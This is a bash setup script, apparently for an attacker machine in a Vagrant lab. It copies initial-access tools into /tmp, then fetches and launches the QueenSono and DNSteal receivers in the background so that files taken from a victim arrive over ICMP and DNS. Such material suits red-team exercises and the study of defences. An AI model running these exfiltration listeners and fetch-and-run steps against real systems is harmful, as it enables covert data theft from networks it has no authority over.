#!/bin/bash

# General
apt update -y
apt install wget netcat -y

#[Initial Access]
mkdir /tmp/1_InitialAccess
cp /vagrant/attack/initialAccess/through_the_wire.py /tmp/1_InitialAccess/through_the_wire.py
cp /vagrant/attack/initialAccess/runme.sh /tmp/1_InitialAccess/runme.sh

#[EXFILTRATION]

# Setup qsreceiver to receive files from victim via ICMP
mkdir /tmp/qs
wget https://github.com/ariary/QueenSono/releases/latest/download/qsreceiver -O /tmp/qs/qsreceiver
chmod +x /tmp/qs/qsreceiver
cp /vagrant/attack/exfiltration/run_qsreceiver.sh /tmp/qs/run_qsreceiver.sh;
chmod +x /tmp/qs/run_qsreceiver.sh
nohup bash /tmp/qs/run_qsreceiver.sh &>/dev/null &

# Setup DNSteal to receive files from victim via DNS
mkdir /tmp/dnsteal
wget https://gist.githubusercontent.com/kevinnivekkevin/0537f0254a6daf19b4141a6d7e1f5697/raw/977a3f61e15de194e04efe209cca630e54e9d6ce/dnsteal.py -O /tmp/dnsteal/DNSteal.py
chmod +x /tmp/dnsteal/DNSteal.py
nohup python2 /tmp/dnsteal/DNSteal.py 10.0.0.5 &>/dev/null &
